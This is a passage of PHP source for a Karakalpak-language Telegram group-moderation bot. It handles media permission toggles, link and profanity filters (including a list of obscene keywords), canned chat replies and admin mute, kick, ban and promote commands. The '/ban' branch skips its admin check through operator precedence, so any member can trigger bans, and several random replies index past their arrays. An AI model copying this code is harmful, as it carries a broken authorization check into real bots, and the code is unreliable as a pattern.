$fayl = "✅Рухсат етілген";
}
$forward1 = $baza["forward"];
if($forward1 == "false"){
$forward1  = "☑Рухсат етілмеген";
}else{
$forward1 = "✅Рухсат етілген";
}
$gif = $baza["gif"];
if($gif == "false"){
$gif  = "☑Рухсат етілмеген";
}else{
$gif = "✅Рухсат етілген";
}
$rasm = $baza["rasm"];
if($rasm == "false"){
$rasm  = "☑Рухсат етілмеген";
}else{
$rasm = "✅Рухсат етілген";
}
$golos = $baza["golos"];
if($golos == "false"){
$golos  = "☑Рухсат етілмеген";
}else{
$golos = "✅Рухсат етілген";
}
$contact = $baza["contact"];
if($contact == "false"){
$contact = "☑Рухсат етілмеген";
}else{
$contact = "✅Рухсат етілген";
}
$user = $baza["user"];
if($user == "false"){
$user = "☑Рухсат етілмеген";
}else{
$user = "✅Рухсат етілген";
}
$hashtag = $baza["hashtag"];
if($hashtag == "false"){
$hashtag = "☑Рухсат етілмеген";
}else{
$hashtag = "✅Рухсат етілген";
}
 $location = $baza["location"];
if($location == "false"){
$location = "☑Рухсат етілмеген";
}else{
$location = "✅Рухсат етілген";
}
$video_note = $baza["video_note"];
if($video_note == "false"){
$video_note  = "☑Рухсат етілмеген";
}else{
$video_note = "✅Рухсат етілген";
}
bot('editMessageText', [
'chat_id'=>$chat_id,
'message_id'=>$mid,
'text'=>"<a href='tg://user?id=$chat_id'>$title</a> <b>группасын сазлау ұщын төмендегі туймелерден пайдаланың:👇</b>\n<b>✅Рухсат етілгенРухсат етілген</b>\n<b>☑Рухсат етілмеген</b>",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[["callback_data"=>"rasm","text"=>"📷Фото"],["callback_data"=>"M()rasm","text"=>"$rasm"],],
[["callback_data"=>"link","text"=>"📡Линк"],["callback_data"=>"M()link","text"=>"$link"],],
[["callback_data"=>"stiker","text"=>"🎭Стикер"],["callback_data"=>"M()stiker","text"=>"$stiker"],],
[["callback_data"=>"fayl","text"=>"📁Файл"],["callback_data"=>"M()fayl","text"=>"$fayl"],],
[["callback_data"=>"video","text"=>"🎬Видео"],["callback_data"=>"M()video","text"=>"$video"],],
[["callback_data"=>"audio","text"=>"🎶 Музыка"],["callback_data"=>"M()audio","text"=>"$audio"],],
[["callback_data"=>"forward","text"=>"➡ Форуард"],["callback_data"=>"M()forward","text"=>"$forward1"],],
[["callback_data"=>"gif","text"=>"💾Гиф"],["callback_data"=>"M()gif","text"=>"$gif"],],
[["callback_data"=>"golos","text"=>"🎤Голось"],["callback_data"=>"M()golos","text"=>"$golos"],],
[["callback_data"=>"contact","text"=>"👤Контакт"],["callback_data"=>"M()contact","text"=>"$contact"],],
[["callback_data"=>"user","text"=>"📧Юзерлер"],["callback_data"=>"M()user","text"=>"$user"],],
[["callback_data"=>"hashtag","text"=>"#⃣ХещТег"],["callback_data"=>"M()hashtag","text"=>"$hashtag"],],
[["callback_data"=>"location","text"=>"🏠Мәнзіл"],["callback_data"=>"M()location","text"=>"$location"],],
[["callback_data"=>"video_note","text"=>"📹Домалақ Видео"],["callback_data"=>"M()video_note","text"=>"$video_note"],],
]
]),
]);
}


if(isset($update) and $Sgif == "false"){
if(isset($message->animation)!==false){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Гиф Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}


if(isset($update) and $Scontact == "false"){
if(isset($message->contact)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Контакт Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Srasm == "false"){
if(isset($message->photo)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Фото Жіберіуге Болмайды!",
'parse_mode'=>"markdown"
]);
}
}

if(isset($update) and $Sstiker == "false"){
if(isset($message->sticker)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Стикер Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Svideo == "false"){
if(isset($message->video)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Видео Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Saudio == "false"){
if(isset($message->audio)!==false){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Музыка Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Sfayl == "false"){
if(isset($message->document)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Файл Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Sforward == "false"){
if(isset($message->forward)!==false){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Форуард Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Sgolos == "false"){
if(isset($message->voice)!==false){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Голос Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and$Slink == "false"){
if((mb_stripos($mtext,"http") !==false) or (stripos($capt,"http://")!==false) or (stripos($capt,"bot?start=")!==false) or (stripos($mtext,"bot?start=")!==false) or (stripos($mtext,"https://")!==false)){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot ('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Реклама Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and$Suser == "false"){
if((mb_stripos($mtext,"@") !==false) or (stripos($capt,"@")!==false) or (stripos($capt,"@")!==false) or (stripos($mtext,"@")!==false)){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot ('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Юзер Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and$Shashtag == "false"){
if((mb_stripos($mtext,"#") !==false) or (stripos($capt,"#")!==false) or (stripos($capt,"#")!==false) or (stripos($mtext,"#")!==false)){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot ('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада ХещТег Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Slocation == "false"){
if(isset($message->location)!==false){
bot ('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Мәнзіл Жіберіуге Болмайды!",
'parse_mode'=>"markdown",
]);
}
}

if(isset($update) and $Svideo_note == "false"){
if(isset($message->video_note)!==false){
bot('deleteMessage', [
'chat_id'=>$chat_id,
'message_id'=> $mid,
]);
bot('SendMessage', [
'chat_id'=>$chat_id,
'text'=>"⚠️[Пайдаланыұщы](tg://user?id=$user_id) Бұл Группада Домалақ Видео Жіберіуге Болмайды!",
'parse_mode'=>"markdown"
]);
}
}
/// YANGI KOD END

    if($text == "/botdev" or $text == "/botdev@Qarawil24_bot"){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"🎓 Админ хаққында билиу ушын, төмендеги Админ тугмесин басың!",
        'reply_markup'=>json_encode([   
        'inline_keyboard'=>[   
            [['text'=>'🎓 Админ', 'callback_data' => "admin"]]
]   
]),
]);
}

    if($data == "admin"){
      bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "🔷️Бот админі: @KaRaKaLPaKxD\nСізлергеде ботлар керек болса, бізге мурәжет етің.Сіз қәлегендей ботларды тез, арзан хәм сыпатлы, етіп арзан бахаларда бот іслеп береміз!",
       'show_alert'=>true
        ]);
    }

		if(stripos($mtext,"saat") !== false){
		$soat = date('H:i', strtotime('5 hour'));
  $text = "⏰Хәзір саат: *$soat*";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$text,
   'parse_mode' => 'markdown'
  ]));
}

		if(stripos($mtext,"bugin") !== false){
        $bugun = date ('d.m.Y', strtotime('5 hour'));
  $text = "📆Бугінгі сәне: *$bugun*";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$text,
   'parse_mode'=> 'markdown'
  ]));
}

if(stripos($mtext,"/id") !== false){
  $text = "*🆔Сіздің ID  мәнзіліңіз:* $fadmin";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$text,
   'parse_mode'=> 'markdown'
  ]));
}

if(stripos($mtext,"/gid") !== false){
  $text = "*🆔Группа ID мәнзілі:* $chat_id";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$text,
   'parse_mode'=> 'markdown'
  ]));
}

if(isset($doc) or isset($gif)){
  $gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="member"){
  bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$mesid
  ]);
}
}

if((stripos($mtext,"Kungrad")!==false) or (stripos($mtext,"Shomanay")!==false) or (stripos($mtext,"Nukus")!==false) or (stripos($mtext,"Nokis")!==false)  or  (stripos($mtext,"Elikkala")!==false) or  (stripos($mtext,"Kanlikol")!==false) or (stripos($mtext,"Shomanay")!==false) or (stripos($mtext,"Rawshan")!==false) or (stripos($mtext,"Maqsim awil")!==false) or (stripos($mtext,"Moynaq")!==false) or (stripos($mtext,"Tashkent")!==false) or (stripos($mtext,"Xojeli")!==false) or (stripos($mtext,"Khodjeyli")!==false)  or  (stripos($mtext,"Qarshidan")!==false) or  (stripos($mtext,"Guliston")!==false) or (stripos($mtext,"Qoqon")!==false) or (stripos($mtext,"qo‘qonl")!==false) or (stripos($mtext,"Qo'qon")!==false) or (stripos($mtext,"Pop")!==false) or (stripos($mtext,"Archabuloq")!==false)){
$input = array("Қай жерінен","Мхм");
  $rand=rand(0,2);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Kim bar") !== false) or (stripos($mtext,"квс")!==false)){
  $name = $message->from->first_name;
  $input = array("Мен бар.Группаға адам қосып беріңсә😊","Мб жоқпа деймен");
  $rand=rand(0,2);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Яғаи") !== false) or (stripos($mtext,"yagay")!==false)){
  $name = $message->from->first_name;
  $input = array("Ауа сондай😅","Сондай щығар?","Не хабар😎");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Raspa") !== false) or (stripos($mtext,"рас")!==false) or (stripos($mtext,"алдама")!==false)){
  $name = $message->from->first_name;
  $input = array("Растан😉","Білмедім","Ия","Мен қай жерден білейн ","Алдадым😆😂");
  $rand=rand(0,5);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"KaRaKaLPaKxD") !== false) or (stripos($mtext,"Koder")!==false) or (stripos($mtext,"Blogger")!==false)){
  $name = $message->from->first_name;
  $input = array("@KaRaKaLPaKxD қызлар менен баса бастағо😆😂");
  $rand=rand(0,1);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Ким бар") !== false) or (stripos($mtext,"кім бар")!==false) or (stripos($mtext,"Кім баррр")!==false) or (stripos($mtext,"Кто в сети")!==false)){
  $name = $message->from->first_name;
  $input = array("Мен бар.Группаға адам қосып беріңсә😊");
  $rand=rand(0,1);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Қалайсыз")!==false)){
$input = array("Жақсы өзіңіз??","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"kvs")!==false) or (stripos($mtext,"kvc")!==false)  or (stripos($mtext,"kbs")!==false)  or (stripos($mtext,"Квс")!==false)){
$input = array("Мен бар.Группаға адам қосып беріңсә😊");
  $rand=rand(0,1);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

  if((stripos($mtext,"Salem") !== false) or (stripos($mtext,"Qalay")!==false)){
 if($fadmin==$admin){
    bot('sendmessage',[
      'chat_id'=>$chat_id,
      'text'=>"@KaRaKaLPaKxD баслық келді😱",
      ]);
  }else{
  $name = $message->from->first_name;
  $input = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,32);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}
  }

if(stripos($mtext,"Қалаилар") !== false){
  $input  = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$soz,
   ]));
}


if(stripos($mtext,"Сәлем") !== false){
  $input  = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$soz,
   ]));
}

if((stripos($mtext,"қалай") !== false) or (stripos($mtext,"қалаи")!==false)  or (stripos($mtext,"калаи")!==false) or (stripos($mtext,"Salam")!==false)  or  (stripos($mtext,"qalaylar")!==false)){
  $input = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,7);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>$soz,
   'parse_mode'=> 'markdown'
  ]));
}

if((stripos($mtext,"Рахмет") !== false) or (stripos($mtext,"Rahmet")!==false)  or (stripos($mtext,"Rahmat")!==false) or (stripos($mtext,"Rahmat kotakon")!==false)  or  (stripos($mtext,"Ulken Rahmet")!==false) or (stripos($mtext," Спасибо")!==false)  or  (stripos($mtext,"спс")!==false) or (stripos($mtext,"Raxmet")!==false)){
  $input = array("Ең жақсы миннетдаршылығыңиз Группамысқа адам қосып беріуыңиз (ツ)");
  $rand=rand(0,1);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
  ]));
}

if(stripos($mtext,"Қалайлар") !== false){
  $name = $message->from->first_name;
  $input = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
  ]));
}

if(stripos($mtext,"Qalaylar")!== false){
  $name = $message->from->first_name;
  $input = array("Жақсы өзіңіз😊","Сәлем қалайсыз личка өте аласыз ба? Мен спам едім!.","Сәлем қалайсыз личка өте аласызба?Сізде гәпім бар еді.Алдыннан рахмет😊");
  $rand=rand(0,3);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
  ]));
}

if((stripos($mtext,"Awmet") !== false) or (stripos($mtext,"Omad")!==false)  or (stripos($mtext,"Omod")!==false) or (stripos($mtext,"Awmet")!==false)  or  (stripos($mtext,"Әумет")!==false) or (stripos($mtext," Аумет")!==false)  or  (stripos($mtext,"Аумет")!==false) or (stripos($mtext,"Awmed")!==false)){
  $input = array("1⃣","2⃣","3⃣","4⃣","5⃣","6⃣","7⃣","8⃣","9⃣","🔟","Кещіресіз сізге сан қалмады!😋");
  $rand=rand(0,11);
  $soz="$input[$rand]";
  $a=json_encode(bot('sendmessage',[
   'reply_to_message_id'=>$mesid,
   'chat_id'=>$chat_id,
   'text'=>$soz,
  ]));
}

if((mb_stripos($mtext,"/soraw") !== false)){ 
bot('SendMessage',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'text'=>"Хабарыңыз админге жіберілді!",
]);
}
if((mb_stripos($mtext,"/soraw") !== false) or (mb_stripos($mtext,"сорау")!==false) or (stripos($mtext,"Кодерчик")!==false) or (mb_stripos($mtext,"Creator")!==false) or (mb_stripos($mtext,"Рекосан")!==false)){ 
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>'html',
'text'=>"✉<b>$title(</b>$chat_id<b>) группасыннан сорау келді:</b>\n<code>$mtext</code>\n  <b>Хабарщы хаққында: </b>
👤<b>Аты:</b>  <a href='tg://user?id=$id'>$from_user_first_name</a>
🆔<b>ID</b>si: $fadmin
🔅<b>Усернамесі:</b> @$username ", null, false
      ]);
   }

  if((stripos($mtext,"/silent")!==false) and $fadmin == $admin){
      $sx=explode("\n",$mtext);
      $useid = $sx[2];
      $chatidsi  = $sx[1];
      $vaqti = $sx[3];
      $minut = strtotime("+$vaqti minutes");
   bot('restrictChatMember', [
      'chat_id' => "-$chatidsi",
      'user_id' => $useid,
      'until_date' => $minut,
      'can_send_messages' => false,
      'can_send_media_messages' => false,
      'can_send_other_messages' => false,
      'can_add_web_page_previews' => false
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "🔹 <a href='tg://user?id=$useid'>Группа Ағзасы</a> $chatidsi Группасында<b>$vaqti</b>  <b>Жазаланды!</b>",
      'parse_mode' => 'html'
  ]);
}


if($text == "/mute" or $text == "/mute" or $text == "/mute" or $text == "/mute@Qarawil24_bot"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
  $minut = strtotime("+99999999999999 minutes");
  bot('restrictChatMember', [
      'chat_id' => $chat_id,
      'user_id' => $id,
      'until_date' => $minut,
      'can_send_messages' => false,
      'can_send_media_messages' => false,
      'can_send_other_messages' => false,
      'can_add_web_page_previews' => false
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "🔹 <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Сізге Админ Тәрепінен Жаза Берілді!</b> ",
      'parse_mode' => 'html'
  ]);
}
}

    if($text == "/Kick"  or  $text == "/kick"  or $text == "/kick" or $text == "/kick@Qarawil24_bot"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
  $vaqti = strtotime("+1 minutes");
  bot('kickChatMember', [
      'chat_id' => $chat_id,
      'user_id' => $id,
      'until_date'=> $vaqti,
  ]);
  bot('unbanChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $id,
    ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "🔹 <a href='tg://user?id=$id'>$from_user_first_name</a> группадан <b>Kick</b> Болды!",
      'parse_mode' => 'html'
  ]);
}
}

if($text =="/ban" or $text == "Xayr" or $text == "/Ban"&&$fadmin==$admin){
       $vaqti = strtotime("+10800000 minutes");
      bot('kickChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $id,
        'until_date' => $vaqti,
      ]);
    bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
    bot('sendMessage', [
        'chat_id'=>$chat_id,
        'text' => "🔹 <a href='tg://user?id=$id'>$from_user_first_name</a> группадан <b>БаН</b> Болдыңыз!",
        'parse_mode'=>'html'
    ]);
  }

  if((stripos($capt,"https://")!==false)  or (stripos($capt,"http://")!==false) or (stripos($capt,"/")!==false) or (stripos($capt,"bot?start=")!==false)  or (stripos($mtext,"@")!==false)  or  (stripos($mtext,"http://") !==false) or  (stripos($mtext,"https://")!==false)){
  if((stripos($capt,"☣")!==false) or (stripos($mtext,"☣")!==false)){
  }else{
  $gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="member"){
    $minut = strtotime("+1 minutes");
    bot('restrictChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $fadmin,
        'until_date' => $minut,
        'can_send_messages' => false,
        'can_send_media_messages' => false,
        'can_send_other_messages' => false,
        'can_add_web_page_previews' => false
    ]);
    bot('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $mid,
    ]);
    bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
    bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "🔹 <a href='tg://user?id=$id'>$first_name</a> группада реклама тасламаң 😡",
        'parse_mode' => 'html'
    ]);
}
}
  }

    if((stripos($mtext,"dalbayop")!==false)  or (stripos($mtext,"oneni")!==false)  or (stripos($mtext,"skaman")!==false) or (stripos($mtext,"sikaman")!==false) or (stripos($mtext,"Axmoq")!==false) or (stripos($mtext,"chumo")!==false)  or  (stripos($mtext,"dalbayob")!==false) or  (stripos($mtext,"skay")!==false) or (stripos($mtext,"seks")!==false) or (stripos($mtext,"dalban")!==false) or (stripos($mtext,"yiban")!==false) or (stripos($mtext,"jalab")!==false) or (stripos($mtext,"скаман")!==false) or (stripos($mtext,"qanjiq")!==false) or (stripos($mtext,"чумо")!==false)  or  (stripos($mtext,"далбаёб")!==false) or  (stripos($mtext,"скай")!==false) or (stripos($mtext,"секс")!==false) or (stripos($mtext,"далбан")!==false) or (stripos($mtext,"йибан")!==false) or (stripos($mtext,"haqorat")!==false) or (stripos($mtext,"жалаб")!==false) or (stripos($mtext,"кутинга")!==false) or (stripos($mtext,"kotinga")!==false) or  (stripos($mtext,"куток")!==false)  or  (stripos($mtext,"qotoq")!==false) or  (stripos($mtext,"naxuy")!==false) or (stripos($mtext,"хуй")!==false) or (stripos($mtext,"сучка")!==false) or (stripos($mtext,"suchka")!==false) or (stripos($mtext,"омини")!==false) or (stripos($mtext,"омнга")!==false) or  (stripos($mtext,"сикаман")!==false)  or  (stripos($mtext,"гандон")!==false) or  (stripos($mtext,"сука")!==false) or (stripos($mtext,"жопа")!==false) or (stripos($mtext,"omingni")!==false) or (stripos($mtext,"ominga")!==false) or (stripos($mtext,"gandon")!==false) and $fadmin !== $admin){
    $gett = bot('getChatMember', [
   'chat_id' => $chat_id,
   'user_id' => $fadmin,
   ]);
  $get = $gett->result->status;
  if($get =="member"){
     $minut = strtotime("+1 minutes");
    bot('restrictChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $fadmin,
        'until_date' => $minut,
        'can_send_messages' => false,
        'can_send_media_messages' => false,
        'can_send_other_messages' => false,
        'can_add_web_page_previews' => false
    ]);
    bot('deleteMessage', [
       'chat_id' => $chat_id,
       'message_id' => $mid
    ]);
    bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
    bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "🔹 <a href='tg://user?id=$id'>$first_name</a> группада сөгінбеңда😡",
        'parse_mode' => 'html'
    ]);
}
}

 if($text == "/admins" or $text == "/admins" or $text == "/admins@Qarawil24_bot"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
  bot('promoteChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$id,
    'can_change_info'=>true,
'can_post_messages'=>false,
'can_edit_messages'=>false,
'can_delete_messages'=>true,
'can_invite_users'=>true,
'can_restrict_members'=>false,
'can_pin_messages'=>true,
'can_promote_members'=>false
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"✅ <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Сізді Құтлықлайман Группа Админстраторысыз❗️</b>",
    'parse_mode'=>'html'
  ]);
}
}

   if($text == "/unadmins" or $text == "/unadmins" or $text == "/unadmins@Qarawil24_bot"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get == "administrator" or $get == "creator"){
bot('promoteChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$id,
    'can_change_info'=>false,
'can_post_messages'=>false,
'can_edit_messages'=>false,
'can_delete_messages'=>false,
'can_invite_users'=>false,
'can_restrict_members'=>false,
'can_pin_messages'=>false,
'can_promote_members'=>false
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
    'chat_id'=> $chat_id,
    'text'=>"☑ <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Сіз Енді Группада Админ Емессіз</b>❗️",
    'parse_mode'=>'html'
  ]);
}
}

  if($text == "/unmute" or $text == "/unmute" or $text == "/Unmute" or $text == "/unmute@Qarawil24_bot"){
 $gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
  bot('restrictChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$id,
    'can_send_messages'=>true,
    'can_send_media_messages'=>true,
    'can_send_other_messages'=>true,
    'can_add_web_page_previews'=>true
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"☑ <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Сізден Щеклеу Алынды. Енді Группада Жазыуыңыз Мумкін!</b>\n<b>Енді Қағыйданы Бұзбайсыз Деген Уміттемен</b> ❗️",
    'parse_mode'=>'html'
  ]);
}
}

if($text=="/Pmadd"&&$fadmin==$admin) {
  bot('promoteChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$id,
    'can_change_info'=>true,
    'can_post_messages'=>false,
    'can_edit_messages'=>false,
    'can_delete_messages'=>true,
    'can_invite_users'=>true,
    'can_restrict_members'=>true,
    'can_pin_messages'=>true,
    'can_promote_members'=>false
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
    'chat_id'=> $chat_id,
